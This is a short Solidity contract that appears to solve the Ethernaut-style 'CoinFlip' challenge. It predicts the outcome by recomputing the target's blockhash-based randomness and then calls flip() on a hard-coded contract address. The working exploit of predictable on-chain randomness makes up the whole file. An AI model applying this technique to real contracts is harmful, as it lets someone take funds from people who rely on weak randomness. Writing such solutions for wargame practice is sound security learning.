// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {ICoinFlip} from "./interfaces/ICoinFlip.sol";

contract CoinFlipAttack {
    address public coinFlipAddress = 0xF5c37e18286acA2BbED0B607C3e2c1b41135149D;
    ICoinFlip coinFlip = ICoinFlip(coinFlipAddress);

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;
        coinFlip.flip(side);
    }
}
